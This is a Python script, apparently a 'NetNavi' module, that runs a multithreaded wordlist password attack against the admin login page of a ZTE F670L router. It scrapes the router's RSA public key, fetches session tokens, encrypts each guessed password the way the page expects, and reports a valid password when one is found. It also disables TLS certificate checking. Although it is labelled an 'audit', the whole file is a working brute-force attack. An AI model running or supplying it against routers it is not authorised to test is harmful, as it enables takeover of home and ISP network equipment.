import urllib.request
import urllib.parse
import http.cookiejar
import ssl
import re
import json
import base64
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

def run_audit(target_ip, input_username, wordlist_path):
    base_url = f"https://{target_ip}"
    login_url = f"{base_url}/PLDTadminLogin"
    token_url = f"{base_url}/?_type=loginData&_tag=login_entry"

    print("\n" + "=" * 55)
    print("  NETNAVI MODULE: ZTE F670L (SAFE CHUNKED AUDIT)")
    print("=" * 55)
    print(f"[*] Target Endpoint : {login_url}")
    print(f"[*] Target Username : {input_username}")
    print(f"[*] Wordlist Source : {wordlist_path}")
    print("-" * 55)

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    def get_public_key():
        try:
            cj = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
            req = urllib.request.Request(login_url, headers={'User-Agent': 'Mozilla/5.0'})
            with opener.open(req, timeout=10) as res:
                html = res.read().decode('utf-8', errors='ignore')
                match = re.search(r'-----BEGIN PUBLIC KEY-----(.*?)-----END PUBLIC KEY-----', html, re.DOTALL)
                if match:
                    key_data = match.group(1).replace('\\n', '').replace('\n', '').strip()
                    return f"-----BEGIN PUBLIC KEY-----\n{key_data}\n-----END PUBLIC KEY-----"
        except Exception:
            pass
        return None

    print("[*] Fetching RSA Public Key from target...")
    pub_key_pem = get_public_key()
    if not pub_key_pem:
        print("[!] ERROR: Failed to retrieve public key from router.")
        return False
    print("[+] Public key loaded successfully.")

    rsa_key = RSA.import_key(pub_key_pem)

    def test_password(password, line_num):
        try:
            cj = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
            
            req_token = urllib.request.Request(
                token_url,
                headers={
                    'User-Agent': 'Mozilla/5.0',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Referer': login_url,
                    'Accept': 'application/json, text/javascript, */*'
                }
            )
            with opener.open(req_token, timeout=5) as res:
                data = json.loads(res.read().decode('utf-8', errors='ignore'))
                token = data.get('sess_token')
                if not token:
                    return line_num, password, False, "No Token"

            combined_payload = token + password
            cipher = PKCS1_v1_5.new(rsa_key)
            enc_password = base64.b64encode(cipher.encrypt(combined_payload.encode('utf-8'))).decode('utf-8')

            post_data = urllib.parse.urlencode({
                '_sessionTOKEN': token,
                'username': input_username,
                'password': enc_password
            }).encode('utf-8')

            req_login = urllib.request.Request(
                login_url,
                data=post_data,
                headers={
                    'User-Agent': 'Mozilla/5.0',
                    'Referer': login_url,
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Accept': 'application/json, text/javascript, */*'
                }
            )
            with opener.open(req_login, timeout=5) as res:
                response_text = res.read().decode('utf-8', errors='ignore')
                final_url = res.geturl()

                is_authenticated = True
                try:
                    resp_json = json.loads(response_text)
                    err_msg = resp_json.get('loginErrMsg', '')
                    if err_msg and err_msg != '':
                        is_authenticated = False
                except Exception:
                    if "pldtadminlogin" in final_url.lower():
                        is_authenticated = False

                return line_num, password, is_authenticated, final_url
        except Exception:
            return line_num, password, False, "Error"

    print("[*] Starting chunked traversal (4 workers, memory-safe)... \n")
    start_time = time.time()
    found_match = False
    chunk_size = 200

    try:
        with open(wordlist_path, 'r', encoding='latin-1') as f:
            chunk = []
            line_idx = 0
            
            for line in f:
                pwd = line.strip()
                if not pwd or pwd.startswith('#'):
                    continue
                line_idx += 1
                chunk.append((line_idx, pwd))
                
                if len(chunk) >= chunk_size:
                    if run_chunk(chunk, test_password, start_time):
                        found_match = True
                        break
                    chunk = []
            
            if not found_match and chunk:
                if run_chunk(chunk, test_password, start_time):
                    found_match = True

        if not found_match:
            print(f"\n[-] Audit completed in {time.time() - start_time:.2f}s. Password not found.")
    except FileNotFoundError:
        print(f"\n[!] ERROR: Wordlist path not found: {wordlist_path}")
    return found_match

def run_chunk(chunk, test_func, start_time):
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = {executor.submit(test_func, pwd, l_num): pwd for l_num, pwd in chunk}
        
        for future in as_completed(futures):
            line_num, password, success, details = future.result()
            elapsed = time.time() - start_time
            speed = (line_num / elapsed) if elapsed > 0 else 0

            status_label = "SUCCESS" if success else "Rejected"
            print(f"[-] Tried [{line_num}] ({speed:.2f} req/s): {password} -> {status_label}")

            if success:
                print("\n" + "=" * 55)
                print("  [+] CHUNKED AUDIT SUCCESSFUL!")
                print(f"  [+] Valid Password Found : {password}")
                print(f"  [+] Final Endpoint       : {details}")
                print("=" * 55 + "\n")
                return True
    return False
